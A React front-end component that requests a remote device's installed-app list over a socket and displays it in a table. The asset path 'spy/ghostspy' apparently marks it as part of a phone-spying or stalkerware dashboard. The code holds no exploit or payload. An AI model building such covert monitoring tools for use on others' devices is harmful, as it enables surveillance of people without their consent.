import React, { useState, useEffect } from "react";
import { useTranslation } from "react-i18next";
import toast from "react-hot-toast";
import { useMediaQuery } from "react-responsive";

import { Grid, Typography, CardMedia, Box } from "@mui/material";

import { useSocketFunctions } from "../../utils/socket";
import { SocketIOPublicEvents } from "../../sections/settings/setting-socket";
import { useSocket } from "../../hooks/use-socket";
import MonitorViewer from "../monitorViewer";

import Color from "src/theme/colors";

const ApplicationsMonitorViewer = ({ monitor, device, onClose }) => {
  const { t } = useTranslation();
  const { onSocketMonitor } = useSocketFunctions();
  const { socket } = useSocket();
  const isTablet = useMediaQuery({ query: "(max-width: 1024px) and (min-width: 476px)" }); // Tablet between 476px and 1024px

  const [changeLoading, setChangeLoading] = useState(false);
  const [recieveAppsHistory, setRecieveAppsHistory] = useState(null);

  useEffect(() => {
    init();
  }, []);

  const onAppsMonitorResponse = (data) => {
    console.log({ data });
    const deviceId = device?.deviceId;
    if (deviceId === data?.deviceId && data?.data.length != 0) {
      setRecieveAppsHistory(data?.data);
      setChangeLoading(false);
    } else {
      toast.error(t("toast.error.empty-data"), {
        position: "bottom-right",
        reverseOrder: false,
        duration: 5000,
        style: {
          backgroundColor: Color.background.red_gray01,
          borderRadius: "5px",
          padding: "3px 10px",
        },
      });
      setChangeLoading(false);
    }
  };

  const init = async () => {
    const deviceId = device?.deviceId;

    try {
      if (deviceId) {
        setChangeLoading(true);
        await onSocketMonitor(SocketIOPublicEvents.application_monitor, {
          deviceId,
        });

        socket.on(`application-shared-${deviceId}`, onAppsMonitorResponse);

        return () => {
          socket.off(`application-shared-${deviceId}`);
        };
      }
    } catch (error) {
      console.error("Error monitoring device:", error);
    }
  };

  const onCloseModal = async () => {
    try {
      setRecieveAppsHistory(null);
      onClose(false);
    } catch (error) {
      console.log("close monitor modal error", error);
    }
  };

  return (
    <MonitorViewer
      initialState={{
        width: isTablet ? 500 : 700,
        height: 500,
        x: isTablet ? 20 : 50,
        y: isTablet ? -400 : -120,
        minWidth: isTablet ? 400 : 500,
        minHeight: 400,
        maxWidth: 700,
        maxHeight: 600,
      }}
      type="application"
      onClose={onCloseModal}
    >
      <div style={{ position: "relative", width: "100%", height: "100%" }}>
        <Grid
          sx={{
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            mt: 2,
            position: "relative",
            width: "100%",
            height: "98%",
          }}
        >
          {changeLoading && (
            <Grid
              sx={{
                position: "absolute",
                top: 0,
                left: 0,
                right: 0,
                bottom: 0,
                display: "flex",
                flexDirection: "column",
                justifyContent: "center",
                alignItems: "center",
                zIndex: 1,
                color: "white",
                width: "100%",
              }}
            >
              <CardMedia
                className="screen-body"
                component="img"
                src={"/assets/logos/spy/ghostspy-logo-_2_.webp"}
                sx={{
                  cursor: "default",
                  width: "auto",
                  height: "auto",
                  borderRadius: "0px",
                }}
              />
            </Grid>
          )}
          <Grid
            sx={{
              display: "flex",
              flexDirection: "column",
              justifyContent: "center",
              alignItems: "center",
              width: "100%",
              height: "100%",
              overflow: "hidden",
              borderRadius: "5px",
            }}
          >
            <Grid
              sx={{
                backgroundColor: "#000",
                width: "100%",
                height: "500px",
                overflowY: "auto",
                cursor: "default",
                color: "white",
              }}
            >
              <Grid container sx={{ backgroundColor: Color.background.purple, p: 1 }}>
                <Grid item xs={4}>
                  <Typography
                    component="h2"
                    sx={{ fontFamily: "Bebas Neue, sans-serif", textAlign: "center" }}
                  >
                    {t("devicesPage.app-monitor.appname")}
                  </Typography>
                </Grid>
                <Grid item xs={4}>
                  <Typography
                    component="h2"
                    sx={{ fontFamily: "Bebas Neue, sans-serif", textAlign: "center" }}
                  >
                    {t("devicesPage.app-monitor.packagename")}
                  </Typography>
                </Grid>
                <Grid item xs={4}>
                  <Typography
                    component="h2"
                    sx={{ fontFamily: "Bebas Neue, sans-serif", textAlign: "center" }}
                  >
                    {t("devicesPage.app-monitor.status")}
                  </Typography>
                </Grid>
              </Grid>
              {recieveAppsHistory != null &&
                recieveAppsHistory.map((apps, index) => (
                  <Grid
                    container
                    key={index}
                    sx={{
                      padding: 1,
                      borderBottom:
                        index !== recieveAppsHistory.length - 1 ? "1px solid #333" : "none",
                    }}
                  >
                    <Grid item xs={4}>
                      <Typography variant="body1" sx={{ textAlign: "center" }}>
                        {apps.appname}
                      </Typography>
                    </Grid>
                    <Grid item xs={4}>
                      <Typography variant="body1" sx={{ textAlign: "center" }}>
                        {apps.packagename}
                      </Typography>
                    </Grid>
                    <Grid item xs={4}>
                      <Box
                        sx={{
                          backgroundColor: Color.background.purple_opacity,
                          border: `solid 1px ${Color.background.purple}`,
                          borderRadius: "50px",
                          width: "100px",
                          margin: "auto",
                        }}
                      >
                        <Typography
                          variant="body1"
                          sx={{
                            textAlign: "center",
                            fontSize: "14px",
                          }}
                        >
                          {t("devicesPage.app-monitor.installed")}
                        </Typography>
                      </Box>
                    </Grid>
                  </Grid>
                ))}
            </Grid>
          </Grid>
        </Grid>
      </div>
    </MonitorViewer>
  );
};

export default ApplicationsMonitorViewer;
